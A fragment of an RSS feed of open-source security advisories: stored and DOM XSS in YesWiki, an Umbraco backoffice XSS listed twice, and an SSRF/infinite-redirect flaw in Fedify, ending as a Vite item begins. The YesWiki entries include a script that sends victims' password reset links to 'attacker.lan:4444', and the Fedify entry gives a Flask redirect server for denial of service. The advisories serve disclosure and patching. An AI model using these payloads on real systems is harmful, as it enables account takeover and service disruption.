                    <title>GHSA-w59h-3x3q-3p6j: 7.6 | <b>Authenticated Stored XSS in YesWiki</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-w59h-3x3q-3p6j</link>
                    <pubDate>2025-01-21T20:10:49Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-w59h-3x3q-3p6j'>https://osv.dev/vulnerability/GHSA-w59h-3x3q-3p6j</a><br>
                            <b>Published:</b> 2025-01-21T20:10:49Z<br>
                            <b>Severity:</b> 7.6<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki/security/advisories/GHSA-w59h-3x3q-3p6j'>https://github.com/YesWiki/yeswiki/security/advisories/GHSA-w59h-3x3q-3p6j</a></li><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki/commit/c1e28b59394957902c31c850219e4504a20db98b'>https://github.com/YesWiki/yeswiki/commit/c1e28b59394957902c31c850219e4504a20db98b</a></li><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki'>https://github.com/YesWiki/yeswiki</a></li><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki/blob/v4.4.5/tools/attach/libs/attach.lib.php#L660'>https://github.com/YesWiki/yeswiki/blob/v4.4.5/tools/attach/libs/attach.lib.php#L660</a></li></ul><br>
                            <b>Details:</b> <b>Authenticated Stored XSS in YesWiki</b><br># Authenticated Stored XSS in YesWiki &amp;lt;= 4.4.5

### Summary
It is possible for an authenticated user with rights to edit&#x2F;create a page or comment to trigger a stored XSS which will be reflected on any page where the resource is loaded.

This Proof of Concept has been performed using the followings:
- YesWiki v4.4.5 (`doryphore-dev` branch, latest)
- Docker environnment (`docker&#x2F;docker-compose.yml`)
- Docker v27.5.0
- Default installation

### Details
The vulnerability makes use of the content edition feature and more specifically of the `{{attach}}` component allowing users to attach files&#x2F;medias to a page. When a file is attached using the `{{attach}}` component, if the resource contained in the `file` attribute doesn&#x27;t exist, then the server will generate a file upload button containing the filename. 

This part of the code is managed in `tools&#x2F;attach&#x2F;libs&#x2F;attach.lib.php` and the faulty function is **[showFileNotExits()](https:&#x2F;&#x2F;github.com&#x2F;YesWiki&#x2F;yeswiki&#x2F;blob&#x2F;doryphore-dev&#x2F;tools&#x2F;attach&#x2F;libs&#x2F;attach.lib.php#L660)**.

```php
public function showFileNotExits()
{
    echo &#x27;&amp;lt;a href=&quot;&#x27; . $this-&amp;gt;wiki-&amp;gt;href(&#x27;upload&#x27;, $this-&amp;gt;wiki-&amp;gt;GetPageTag(), &quot;file=$this-&amp;gt;file&quot;) . &#x27;&quot; class=&quot;btn btn-primary&quot;&amp;gt;&amp;lt;i class=&quot;fa fa-upload icon-upload icon-white&quot;&amp;gt;&amp;lt;&#x2F;i&amp;gt; &#x27; . _t(&#x27;UPLOAD_FILE&#x27;) . &#x27; &#x27; . $this-&amp;gt;file . &#x27;&amp;lt;&#x2F;a&amp;gt;&#x27;;
}
```

The file name attribute is not properly sanitized when returned to the client, therefore allowing the execution of malicious JavaScript code in the client&#x27;s browser.

### PoC
#### 1. Simple XSS
Here is a working payload `{{attach file=&quot;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;&#x2F;script&amp;gt;&quot; desc=&quot;&quot; size=&quot;original&quot; class=&quot; whiteborder zoom&quot; nofullimagelink=&quot;1&quot;}}` tha works in pages and comments:

On a comment:

![poc1](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;dab6b08e-f542-41fd-872d-d221fd228229)
![poc2](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;50eff326-df36-482b-be87-c4e3866497cf)


On a page:

![poc3](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;e9f4761a-6b7d-4508-aad5-21d4cedcd179)
![poc4](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7945b9bb-bc8e-4e01-86d7-bbba823ba67c)

#### 2. Full account takeover scenario
By changing the payload of the XSS it was possible to establish a full acount takeover through a weak password recovery mechanism abuse ([CWE-460](https:&#x2F;&#x2F;cwe.mitre.org&#x2F;data&#x2F;definitions&#x2F;640.html)). The following exploitation script allows an attacker to extract the password reset link of every logged in user that is triggered by the XSS:

```javascript
fetch(&#x27;&#x2F;?ParametresUtilisateur&#x27;)
  .then(response =&amp;gt; {
    return response.text();
  })
  .then(htmlString =&amp;gt; {
    const parser = new DOMParser();
    const doc = parser.parseFromString(htmlString, &#x27;text&#x2F;html&#x27;);
    const resetLinkElement = doc.querySelector(&#x27;.control-group .controls a&#x27;); &#x2F;&#x2F;dirty
    fetch(&#x27;http:&#x2F;&#x2F;attacker.lan:4444&#x2F;?xss=&#x27;.concat(btoa(resetLinkElement.href)));
  })
```

Posting a comment using this specially crafted payload with a user account:

![poc5](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7c143b99-a81e-4834-9453-5be067e19521)

Allows our administrator account&#x27;s password reset link to be sent to the listener of the attacker:

![poc7](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;bbf8c3e2-22a6-4a57-bc32-d6ca2e619cb9)
![poc8](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;18d5cb6e-5085-4a87-91db-2afebf40c60a)

Therefore giving us access to an successful password reset for any account triggering the XSS:

![poc9](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7e237b92-0bec-4754-b65c-59f70c010ef4)

### Impact
This vulnerability allows any malicious authenticated user that has the right to create a comment or edit a page to be able to steal accounts and therefore modify pages, comments, permissions, extract user data (emails), thus impacting the integrity, availabilty and confidentiality of a YesWiki instance.

### Suggestion of possible corrective measures
- Sanitize properly the filename attribute

```php
public function showFileNotExits()
{
    $filename = htmlspecialchars($this-&amp;gt;file);
    echo &#x27;&amp;lt;a href=&quot;&#x27; . $this-&amp;gt;wiki-&amp;gt;href(&#x27;upload&#x27;, $this-&amp;gt;wiki-&amp;gt;GetPageTag(), &quot;file=$filename&quot;) . &#x27;&quot; class=&quot;btn btn-primary&quot;&amp;gt;&amp;lt;i class=&quot;fa fa-upload icon-upload icon-white&quot;&amp;gt;&amp;lt;&#x2F;i&amp;gt; &#x27; . _t(&#x27;UPLOAD_FILE&#x27;) . &#x27; &#x27; . $filename . &#x27;&amp;lt;&#x2F;a&amp;gt;&#x27;;
}
```

- Implement a stronger password reset mechanism through:
  + Not showing a password reset link to an already logged-in user. 
  + Generating a password reset link when a reset is requested by a user, and only send it by mail.
  + Add an expiration&#x2F;due date to the token

- Implement a strong Content Security Policy to mitigate other XSS sinks (preferably using a random nonce)
&amp;gt; The latter idea is expensive to develop&#x2F;implement, but given the number of likely sinks allowing Cross Site Scripting in the YesWiki source code, it seems necessary and easier than seeking for any improperly sanitized user input.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-wphc-5f2j-jhvg: 7.6 | <b>Unauthenticated DOM Based XSS in YesWiki</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-wphc-5f2j-jhvg</link>
                    <pubDate>2025-01-21T20:08:37Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-wphc-5f2j-jhvg'>https://osv.dev/vulnerability/GHSA-wphc-5f2j-jhvg</a><br>
                            <b>Published:</b> 2025-01-21T20:08:37Z<br>
                            <b>Severity:</b> 7.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki/security/advisories/GHSA-wphc-5f2j-jhvg'>https://github.com/YesWiki/yeswiki/security/advisories/GHSA-wphc-5f2j-jhvg</a></li><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki/commit/c1e28b59394957902c31c850219e4504a20db98b'>https://github.com/YesWiki/yeswiki/commit/c1e28b59394957902c31c850219e4504a20db98b</a></li><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki'>https://github.com/YesWiki/yeswiki</a></li></ul><br>
                            <b>Details:</b> <b>Unauthenticated DOM Based XSS in YesWiki</b><br># Unauthenticated DOM Based XSS in YesWiki &amp;lt;= 4.4.5

### Summary
It is possible for any end-user to craft a DOM based XSS on all of YesWiki&#x27;s pages which will be triggered when a user clicks on a malicious link.

This Proof of Concept has been performed using the followings:
- YesWiki v4.4.5 (`doryphore-dev` branch, latest)
- Docker environnment (`docker&#x2F;docker-compose.yml`)
- Docker v27.5.0
- Default installation

### Details
The vulnerability makes use of the search by tag feature. When a tag doesn&#x27;t exist, the tag is reflected on the page and isn&#x27;t properly sanitized on the server side which allows a malicious user to generate a link that will trigger an XSS on the client&#x27;s side when clicked. 

This part of the code is managed by `tools&#x2F;tags&#x2F;handlers&#x2F;page&#x2F;listpages.php`, and **[this piece of code](https:&#x2F;&#x2F;github.com&#x2F;YesWiki&#x2F;yeswiki&#x2F;blob&#x2F;doryphore-dev&#x2F;tools&#x2F;tags&#x2F;handlers&#x2F;page&#x2F;listpages.php#L84)** is responsible for the vulnerability:

```php
$output .= &#x27;&amp;lt;div class=&quot;alert alert-info&quot;&amp;gt;&#x27; . &quot;\n&quot;;
if ($nb_total &amp;gt; 1) {
    $output .= _t(&#x27;TAGS_TOTAL_NB_PAGES&#x27;, [&#x27;nb_total&#x27; =&amp;gt; $nb_total]);
} elseif ($nb_total == 1) {
    $output .= _t(&#x27;TAGS_ONE_PAGE_FOUND&#x27;);
} else {
    $output .= _t(&#x27;TAGS_NO_PAGE&#x27;);
}
$output .= (!empty($tab_selected_tags) ? &#x27; &#x27; . _t(&#x27;TAGS_WITH_KEYWORD&#x27;) . &#x27; &#x27; . implode(&#x27; &#x27; . _t(&#x27;TAGS_WITH_KEYWORD_SEPARATOR&#x27;) . &#x27; &#x27;, array_map(function ($tagName) {
    return &#x27;&amp;lt;span class=&quot;tag-label label label-info&quot;&amp;gt;&#x27; . $tagName . &#x27;&amp;lt;&#x2F;span&amp;gt;&#x27;;
}, $tab_selected_tags)) : &#x27;&#x27;) . &#x27;.&#x27;;
$output .= $this-&amp;gt;Format(&#x27;{{rss tags=&quot;&#x27; . $tags . &#x27;&quot; class=&quot;pull-right&quot;}}&#x27;) . &quot;\n&quot;;
$output .= &#x27;&amp;lt;&#x2F;div&amp;gt;&#x27; . &quot;\n&quot; . $text;

echo $this-&amp;gt;Header();
echo &quot;&amp;lt;div class=\&quot;page\&quot;&amp;gt;\n$output\n$outputselecttag\n&amp;lt;hr class=\&quot;hr_clear\&quot; &#x2F;&amp;gt;\n&amp;lt;&#x2F;div&amp;gt;\n&quot;;
echo $this-&amp;gt;Footer();
```

The tag names aren&#x27;t properly sanitized when adding them to the page&#x27;s response, thus when a tag name is user controlled, it allows client side code execution. This case describes a case where the tag name doesn&#x27;t exist, but if an admin creates a malicious tag, it will also end up in XSS when rendered.

### PoC
#### 1. Simple XSS
Abusing the `tags` parameter, we can successfully obtain client side javascript execution:

![poc1](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;cfd59dd6-ebda-4587-b903-d2777fc7d780)

#### 2. Full account takeover scenario
By changing the payload of the XSS it was possible to establish a full acount takeover through a weak password recovery mechanism abuse ([CWE-460](https:&#x2F;&#x2F;cwe.mitre.org&#x2F;data&#x2F;definitions&#x2F;640.html)). The following exploitation script allows an attacker to extract the password reset link of every logged in user that is triggered by the XSS:

```javascript
fetch(&#x27;&#x2F;?ParametresUtilisateur&#x27;)
  .then(response =&amp;gt; {
    return response.text();
  })
  .then(htmlString =&amp;gt; {
    const parser = new DOMParser();
    const doc = parser.parseFromString(htmlString, &#x27;text&#x2F;html&#x27;);
    const resetLinkElement = doc.querySelector(&#x27;.control-group .controls a&#x27;); &#x2F;&#x2F;dirty
    fetch(&#x27;http:&#x2F;&#x2F;attacker.lan:4444&#x2F;?xss=&#x27;.concat(btoa(resetLinkElement.href)));
  })
```

Hosting this script on a listener, when an admin is tricked into clicking on a maliciously crafted link, we can then reset its password and takeover their account.

![poc2](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;02884697-f0a5-43df-8bab-d83f8c9a102d)
![poc3](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;ef5b44f1-97bb-4cf1-a32b-471f8c672ebd)
![poc4](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;6a0193a2-1a01-4c65-bd97-f7c900f7f174)

### Impact
This vulnerability allows any user to generate a malicious link that will trigger an account takeover when clicked, therefore allowing a user to steal other accounts, modify pages, comments, permissions, extract user data (emails), thus impacting the integrity, availabilty and confidentiality of a YesWiki instance.

### Suggestion of possible corrective measures
- Sanitize properly the tag names when created [here](https:&#x2F;&#x2F;github.com&#x2F;YesWiki&#x2F;yeswiki&#x2F;blob&#x2F;doryphore-dev&#x2F;tools&#x2F;tags&#x2F;services&#x2F;TagsManager.php#L60)

```php
        foreach ($tags as $tag) {
            trim($tag);
            if ($tag != &#x27;&#x27;) {
                if (!$this-&amp;gt;tripleStore-&amp;gt;exist($page, &#x27;http:&#x2F;&#x2F;outils-reseaux.org&#x2F;_vocabulary&#x2F;tag&#x27;, htmlspecialchars($tag), &#x27;&#x27;, &#x27;&#x27;)) {
                    $this-&amp;gt;tripleStore-&amp;gt;create($page, &#x27;http:&#x2F;&#x2F;outils-reseaux.org&#x2F;_vocabulary&#x2F;tag&#x27;, htmlspecialchars($tag), &#x27;&#x27;, &#x27;&#x27;);
                }
                &#x2F;&#x2F;on supprime ce tag du tableau des tags restants a effacer
                if (isset($tags_restants_a_effacer)) {
                    unset($tags_restants_a_effacer[array_search($tag, $tags_restants_a_effacer)]);
                }
            }
        }
```

- Sanitize the tag names when looked for [here](https:&#x2F;&#x2F;github.com&#x2F;YesWiki&#x2F;yeswiki&#x2F;blob&#x2F;doryphore-dev&#x2F;tools&#x2F;tags&#x2F;handlers&#x2F;page&#x2F;listpages.php#L15)

```php
&#x2F;&#x2F;$tags = (isset($_GET[&#x27;tags&#x27;])) ? $_GET[&#x27;tags&#x27;] : &#x27;&#x27;;
$tags = (isset($_GET[&#x27;tags&#x27;])) ? htmlspecialchars($_GET[&#x27;tags&#x27;]) : &#x27;&#x27;;
```

- Implement a stronger password reset mechanism through:
  + Not showing a password reset link to an already logged-in user. 
  + Generating a password reset link when a reset is requested by a user, and only send it by mail.
  + Add an expiration&#x2F;due date to the token

- Implement a strong Content Security Policy to mitigate other XSS sinks (preferably using a random nonce)
&amp;gt; The latter idea is expensive to develop&#x2F;implement, but given the number of likely sinks allowing Cross Site Scripting in the YesWiki source code, it seems necessary and easier than seeking for any improperly sanitized user input.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-wv8v-rmw2-25wc: 4.6 | <b>XSS&#x2F;HTML Injection Vulnerability in Umbraco Backoffice Components</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-wv8v-rmw2-25wc</link>
                    <pubDate>2025-01-21T19:59:13Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-wv8v-rmw2-25wc'>https://osv.dev/vulnerability/GHSA-wv8v-rmw2-25wc</a><br>
                            <b>Published:</b> 2025-01-21T19:59:13Z<br>
                            <b>Severity:</b> 4.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc'>https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2'>https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS'>https://github.com/umbraco/Umbraco-CMS</a></li></ul><br>
                            <b>Details:</b> <b>XSS&#x2F;HTML Injection Vulnerability in Umbraco Backoffice Components</b><br>### Impact
Authenticated users are able to exploit an XSS vulnerability when viewing certain localized backoffice components.

### Patches
Will be patched in 14.3.2 and 15.1.2.

Note:
This issue was reported by Pratik Patil from NetSPI @Nexusss-ppatil
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-wv8v-rmw2-25wc: 4.6 | <b>XSS&#x2F;HTML Injection Vulnerability in Umbraco Backoffice Components</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-wv8v-rmw2-25wc</link>
                    <pubDate>2025-01-21T19:59:13Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-wv8v-rmw2-25wc'>https://osv.dev/vulnerability/GHSA-wv8v-rmw2-25wc</a><br>
                            <b>Published:</b> 2025-01-21T19:59:13Z<br>
                            <b>Severity:</b> 4.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc'>https://github.com/umbraco/Umbraco-CMS/security/advisories/GHSA-wv8v-rmw2-25wc</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2'>https://github.com/umbraco/Umbraco-CMS/commit/d4f8754f933895b3a329296e25ddea6f84a0aea2</a></li><li>- <a target='_blank' href='https://github.com/umbraco/Umbraco-CMS'>https://github.com/umbraco/Umbraco-CMS</a></li></ul><br>
                            <b>Details:</b> <b>XSS&#x2F;HTML Injection Vulnerability in Umbraco Backoffice Components</b><br>### Impact
Authenticated users are able to exploit an XSS vulnerability when viewing certain localized backoffice components.

### Patches
Will be patched in 14.3.2 and 15.1.2.

Note:
This issue was reported by Pratik Patil from NetSPI @Nexusss-ppatil
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-c59p-wq67-24wx: 5.4 | <b>Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify&#x2F;fedify</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-c59p-wq67-24wx</link>
                    <pubDate>2025-01-21T19:58:29Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-c59p-wq67-24wx'>https://osv.dev/vulnerability/GHSA-c59p-wq67-24wx</a><br>
                            <b>Published:</b> 2025-01-21T19:58:29Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx'>https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx</a></li><li>- <a target='_blank' href='https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151'>https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151</a></li><li>- <a target='_blank' href='https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a'>https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a</a></li><li>- <a target='_blank' href='https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645'>https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645</a></li><li>- <a target='_blank' href='https://github.com/dahlia/fedify'>https://github.com/dahlia/fedify</a></li></ul><br>
                            <b>Details:</b> <b>Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify&#x2F;fedify</b><br>### Summary
This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.
Moreover, this issue can also be maneuvered into performing a Blind SSRF attack.

### Details
The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (https:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;activitypub&#x2F;#security-considerations), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.

The **lookupWebFinger** function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.
On Fedify, two client-facing functions implement the **lookupWebFinger** function- **getActorHandle**, and **lookupObject**, which are both used as a wrapper for the vulnerable lookup function.
As the **lookupObject** function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way **getActorHandle** is.

The **getActorHandle** function is a wrapper function for the **getActorHandleInternal** function (both present at _&#x2F;src&#x2F;vocab&#x2F;actor.ts_):
```javascript
async function getActorHandleInternal(
  actor: Actor | URL,
  options: GetActorHandleOptions = {},
): Promise&amp;lt;`@${string}@${string}` | `${string}@${string}`&amp;gt; {
  const actorId = actor instanceof URL ? actor : actor.id;
  if (actorId != null) {
    const result = await lookupWebFinger(actorId, {
      userAgent: options.userAgent,
      tracerProvider: options.tracerProvider,
    });
    if (result != null) {
      const aliases = [...(result.aliases ?? [])];
      if (result.subject != null) aliases.unshift(result.subject);
      for (const alias of aliases) {
        const match = alias.match(&#x2F;^acct:([^@]+)@([^@]+)$&#x2F;);
        if (match != null) {
          const hostname = new URL(`https:&#x2F;&#x2F;${match[2]}&#x2F;`).hostname;
          if (
            hostname !== actorId.hostname &amp;&amp;
            !await verifyCrossOriginActorHandle(
              actorId.href,
              alias,
              options.userAgent,
              options.tracerProvider,
            )
          ) {
            continue;
          }
          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);
        }
      }
    }
  }
  if (
    !(actor instanceof URL) &amp;&amp; actor.preferredUsername != null &amp;&amp;
    actor.id != null
  ) {
    return normalizeActorHandle(
      `@${actor.preferredUsername}@${actor.id.host}`,
      options,
    );
  }
  throw new TypeError(
    &quot;Actor does not have enough information to get the handle.&quot;,
  );
}
```

The **actorId** parameter containing a URL of the actor ID sinks into the **lookupWebFinger** function which is a wrapper for the **lookupWebFingerInternal**:
```javascript
async function lookupWebFingerInternal(
  resource: URL | string,
  options: LookupWebFingerOptions = {},
): Promise&amp;lt;ResourceDescriptor | null&amp;gt; {
  if (typeof resource === &quot;string&quot;) resource = new URL(resource);
  let protocol = &quot;https:&quot;;
  let server: string;
  if (resource.protocol === &quot;acct:&quot;) {
    const atPos = resource.pathname.lastIndexOf(&quot;@&quot;);
    if (atPos &amp;lt; 0) return null;
    server = resource.pathname.substring(atPos + 1);
    if (server === &quot;&quot;) return null;
  } else {
    protocol = resource.protocol;
    server = resource.host;
  }
  let url = new URL(`${protocol}&#x2F;&#x2F;${server}&#x2F;.well-known&#x2F;webfinger`);
  url.searchParams.set(&quot;resource&quot;, resource.href);
  while (true) {
    logger.debug(
      &quot;Fetching WebFinger resource descriptor from {url}...&quot;,
      { url: url.href },
    );
    let response: Response;
    try {
      response = await fetch(url, {
        headers: {
          Accept: &quot;application&#x2F;jrd+json&quot;,
          &quot;User-Agent&quot;: typeof options.userAgent === &quot;string&quot;
            ? options.userAgent
            : getUserAgent(options.userAgent),
        },
        redirect: &quot;manual&quot;,
      });
    } catch (error) {
      logger.debug(
        &quot;Failed to fetch WebFinger resource descriptor: {error}&quot;,
        { url: url.href, error },
      );
      return null;
    }
    if (
      response.status &amp;gt;= 300 &amp;&amp; response.status &amp;lt; 400 &amp;&amp;
      response.headers.has(&quot;Location&quot;)
    ) {
      url = new URL(
        response.headers.get(&quot;Location&quot;)!,
        response.url == null || response.url === &quot;&quot; ? url : response.url,
      );
      continue;
    }
    if (!response.ok) {
      logger.debug(
        &quot;Failed to fetch WebFinger resource descriptor: {status} {statusText}.&quot;,
        {
          url: url.href,
          status: response.status,
          statusText: response.statusText,
        },
      );
      return null;
    }
    try {
      return await response.json() as ResourceDescriptor;
    } catch (e) {
      if (e instanceof SyntaxError) {
        logger.debug(
          &quot;Failed to parse WebFinger resource descriptor as JSON: {error}&quot;,
          { error: e },
        );
        return null;
      }
      throw e;
    }
  }
}
```

The function takes the **actorId** parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.

On the fetch request, the **redirect** attribute is set to “**manual**” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300&amp;gt;status code&amp;gt;400).

This custom redirect implementation contains multiple issues:
1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.
2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.
3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.

In order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.


### PoC
1. In order to show a use case of the vulnerability, we can use the demo app presented at this URL: https:&#x2F;&#x2F;github.com&#x2F;dahlia&#x2F;microblog.
2. We will create two machines, victim and attacker, each one on a different server with different domains.

**_Victim Machine_**
1. Create a new instance (we tested on ubuntu’s latest version), and update the package manager.
2. Install a Deno server:
`
curl -fsSL https:&#x2F;&#x2F;deno.land&#x2F;install.sh | sh
`
`
source ~&#x2F;.bashrc
`
`
deno --version #check deno is working
`
3. Pull the git repository of the victim blog app:
`
git clone https:&#x2F;&#x2F;github.com&#x2F;dahlia&#x2F;fedify.git
`
4. Modify the federation object to remove signature checks for the sake of easy testing:
On file **_&#x2F;examples&#x2F;blog&#x2F;federation&#x2F;mod.ts_** edit the **_createFederation&amp;lt;void&amp;gt;_** object the following attribute: **_skipSignatureVerification: true_**.
5. Change into the blog app directory ( &#x2F;examples&#x2F;blog ) and run the app:
`
deno task preview
`
6. Surf to the application on the browser, and register a user on the app.

**_Attacker Machine_**
1. Create a new instance (we tested on ubuntu’s latest version), and update the package manager.
2. Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):
`
curl -o- https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;nvm-sh&#x2F;nvm&#x2F;v0.40.1&#x2F;install.sh | bash
`
`
source ~&#x2F;.bashrc
`
`
nvm list-remote
`
3. Install the latest stable version:
`
nvm install {latest_ver} #for example: v20.10.0
`
`
source ~&#x2F;.bashrc
`
`
npm -v #check it works
`
`
node -v #check it works
`
4. Download the attacker app repository:
`
git clone https:&#x2F;&#x2F;github.com&#x2F;dahlia&#x2F;microblog.git
`
5. Disable request signature validations:
Edit the **_&#x2F;src&#x2F;federation.ts_** file and add a **_skipSignatureVerification: true_** attribute to the **_createFederation_** object.
6. Modify the **_&#x2F;src&#x2F;federation.ts_** file and tamper with the Person object on the actor dispatcher ( **_setActorDispatcher(&quot;&#x2F;users&#x2F;{identifier}&quot;_** ) - change the actor ID attribute **_“id: ctx.getActorUri(identifier)_**” into “**_id: new URL(‘http:&#x2F;&#x2F;&amp;lt;ATTACKER_MACHINE_DOMAIN&amp;gt;:1337&#x2F;users&#x2F;enterloop’)_**”.
7. Install python flask and create the Python Flask redirect server:
`
apt update
`
`
apt install python3-flask
`
```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route(&#x27;&#x2F;health&#x27;)
def health():
    return &quot;hello&quot;, 200

@app.route(&#x27;&#x2F;.well-known&#x2F;webfinger&#x27;)
def ssrfinger():
    return redirect(&quot;http:&#x2F;&#x2F;&amp;lt;ATTACKER_MACHINE_DOMAIN&amp;gt;:1337&#x2F;endlessloop&quot;)

@app.route(&#x27;&#x2F;endlessloop&#x27;)
def endlessloop():
    return redirect(&quot;http:&#x2F;&#x2F;&amp;lt;ATTACKER_MACHINE_DOMAIN&amp;gt;:1337&#x2F;endlessloop&quot;)

if __name__ == &#x27;__main__&#x27;:
    app.run(debug=True,host=&#x27;0.0.0.0&#x27; ,port=1337)
```
8.  Run the python server and attempt to reach the “**_&#x2F;health_**” path to see the server functions as expected.
9. Read the **_README.txt_** file on the attacker app and follow the instructions on how to execute the app.
10. Surf the app on the browser and attempt to follow the federated user on the victim’s machine.
11. Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).


### Impact
1. Implement a limiting stop condition for the endless loop to prevent infinite loops.
2. Validate the scheme while performing a manual redirection handler.
3. For each web resource (for the **_lookupWebFinger_** function and also URLs found on the “**_Location_**” header inside the loop) use the “**_validatePublicUrl_**” function to verify that it is not targeting a local resource.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vg6x-rcgg-rjx6: 6.5 | <b>Websites were able to send any requests to the development server and read the response in vite</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vg6x-rcgg-rjx6</link>
                    <pubDate>2025-01-21T19:52:55Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vg6x-rcgg-rjx6'>https://osv.dev/vulnerability/GHSA-vg6x-rcgg-rjx6</a><br>
                            <b>Published:</b> 2025-01-21T19:52:55Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6'>https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a></li><li>- <a target='_blank' href='https://github.com/vitejs/vite'>https://github.com/vitejs/vite</a></li></ul><br>
                            <b>Details:</b> <b>Websites were able to send any requests to the development server and read the response in vite</b><br>### Summary
